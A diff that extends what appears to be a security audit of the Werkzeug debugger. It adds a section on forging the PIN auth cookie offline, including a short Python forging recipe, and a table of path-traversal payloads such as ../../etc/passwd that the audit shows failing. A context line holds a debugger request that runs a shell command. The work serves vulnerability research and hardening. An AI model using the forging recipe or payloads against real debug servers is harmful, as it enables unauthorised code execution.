@@ -352,7 +352,132 @@ GET /?__debugger__=yes&cmd=__import__('os').popen('id').read()&frm=0&s=<SECRET>
 
 ---
 
-## 11. Recommendations
+## 11. Cookie Forgery - Fully Forgeable Without Server Interaction
+
+### 11.1 Cookie Format (No Integrity Protection)
+
+The PIN auth cookie set at `__init__.py:517-523` has the format:
+```
+<cookie_name> = <timestamp>|<hash_pin(pin)>
+```
+
+Where `hash_pin(pin)` is simply `sha1(pin + " added salt")[:12]` (`__init__.py:44-45`).
+
+**There is no HMAC, no server-side secret, no signature.** The cookie is entirely self-contained.
+
+### 11.2 Validation is Pure String Comparison
+
+`check_pin_trust()` at `__init__.py:450-462`:
+```python
+val = parse_cookie(environ).get(self.pin_cookie_name)
+ts_str, pin_hash = val.split("|", 1)
+ts = int(ts_str)
+if pin_hash != hash_pin(self.pin):    # Just compares hashes!
+    return None
+return (time.time() - PIN_TIME) < ts  # Timestamp within 7 days
+```
+
+No server secret is mixed into the cookie. If you know the PIN, you forge the cookie directly.
+
+### 11.3 Offline PIN Brute Force (Bypasses Rate Limiting)
+
+The PIN is 9 digits = 10^9 = 1,000,000,000 possibilities. The `hash_pin()` function is a single SHA-1 call:
+```python
+hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]
+```
+
+At ~10M SHA-1/sec on a modern CPU, all billion PINs can be computed in **~100 seconds**. This completely bypasses the 10-attempt lockout and rate limiting at `__init__.py:447-472`, since those only apply to the online `pinauth` endpoint.
+
+### 11.4 Cookie Name is Also Derivable
+
+The cookie name `__wzd<20 hex chars>` is derived from the same public+private bits as the PIN (`__init__.py:203-205`). If you can reconstruct the PIN, you can also reconstruct the cookie name.
+
+### 11.5 Timestamp is Self-Asserted
+
+The timestamp in the cookie is set by the server but **validated only as "within 7 days"** (`__init__.py:462`):
+```python
+return (time.time() - PIN_TIME) < ts
+```
+An attacker sets `ts = int(time.time())` and the check passes.
+
+### 11.6 Forging Recipe
+
+```python
+import hashlib, time
+
+pin = "123456789"  # From PIN reconstruction or brute force
+pin_hash = hashlib.sha1(f"{pin} added salt".encode()).hexdigest()[:12]
+forged_cookie = f"{int(time.time())}|{pin_hash}"
+# Set as: Cookie: __wzd<cookie_name_hash>=<forged_cookie>
+```
+
+This skips the `pinauth` endpoint entirely, avoiding all rate limiting and lockout mechanisms.
+
+---
+
+## 12. Path Traversal in `f` Parameter - Comprehensive Bypass Analysis
+
+### 12.1 The Defense
+
+```python
+def get_resource(self, request: Request, filename: str) -> Response:
+    path = join("shared", basename(filename))  # Line 422
+    data = pkgutil.get_data(__package__, path)  # Line 425
+```
+
+### 12.2 Bypass Attempts (19 Categories Tested)
+
+| Category | Payload Example | basename() Result | Outcome |
+|----------|----------------|-------------------|---------|
+| Directory traversal | `../../etc/passwd` | `passwd` | Stripped -> 404 |
+| Null byte | `../__init__.py\x00.css` | `__init__.py\x00.css` | ValueError: embedded null byte |
+| Backslash (Linux) | `..\__init__.py` | `..\__init__.py` (literal!) | FileNotFoundError (not a separator on Linux) |
+| Unicode slashes | `..∕__init__.py` (U+2215) | `..∕__init__.py` | FileNotFoundError (not recognized as separator) |
+| Fullwidth slash | `..／file` (U+FF0F) | `..／file` | FileNotFoundError |
+| URL encoding | `..%2f__init__.py` | `..%2f__init__.py` | FileNotFoundError (basename doesn't URL-decode) |
+| Double encoding | `..%252f__init__.py` | `..%252f__init__.py` | FileNotFoundError |
+| Overlong UTF-8 | `..\xc0\xaf__init__.py` | `..\xc0\xaf__init__.py` | FileNotFoundError |
+| Dot-dot bare | `..` | `..` | `shared/..` -> IsADirectoryError |
+| Empty/slash | `/` or `foo/` | `` (empty) | `shared/` -> IsADirectoryError |
+| os.path.join absolute | N/A | Never absolute | basename can't return `/...` |
+| Very long path | `../` * 1000 | `__init__.py` | Stripped -> 404 |
+| CRLF in download_name | `file\r\nHeader: val` | N/A | Werkzeug blocks: "Header values must not contain newline characters" |
+
+### 12.3 Key Insight: pkgutil.get_data Does NOT Enforce Its Own Restrictions
+
+The `pkgutil.get_data()` docstring states: *"The parent directory name '..' is not allowed"*. **This is a lie.** It is never enforced:
+
+```python
+# These all SUCCEED despite the docstring:
+pkgutil.get_data("werkzeug.debug", "shared/../console.py")     # -> 6089 bytes (console.py source!)
+pkgutil.get_data("werkzeug.debug", "shared/../../security.py") # -> 6588 bytes (security.py source!)
+```
+
+If `basename()` were removed, `pkgutil.get_data` would allow reading any file within the werkzeug package tree and potentially beyond.
+
+### 12.4 Verdict
+
+**`basename()` is an effective guard on Linux.** It is fundamentally impossible to make `basename()` return a string containing `/` on POSIX systems - the function's entire purpose is to strip directory components. The only "interesting" return values are `.`, `..`, and empty string, none of which produce a readable file path when joined with `shared/`.
+
+However, the defense is **fragile by design**: it relies entirely on `basename()` and has no defense-in-depth. The `pkgutil.get_data()` function provides zero additional protection despite its documentation claiming otherwise. If anyone refactored this code and removed the `basename()` call, path traversal would be immediately exploitable.
+
+### 12.5 Shared Directory Contents - No Sensitive Data
+
+The `shared/` directory contains only static assets:
+| File | Size | Content |
+|------|------|---------|
+| `debugger.js` | 10,068 bytes | Client-side debugger JS (reveals full API surface but not SECRET) |
+| `style.css` | 6,078 bytes | Debugger styling |
+| `console.png` | 507 bytes | Console icon |
+| `more.png` | 200 bytes | Expand icon |
+| `less.png` | 191 bytes | Collapse icon |
+| `ICON_LICENSE.md` | 222 bytes | Icon attribution |
+
+No secrets, no server-side code, no configuration. The `debugger.js` file does reveal the complete debugger API surface (endpoint patterns, parameter names), but the actual `SECRET` token is injected into the HTML page template, not into the JS file.
+
+---
+
+## 13. Recommendations
 
 1. **Never enable the Werkzeug debugger in production** - it is designed for development only
 2. **Never set `WERKZEUG_DEBUG_PIN=off`** in any environment
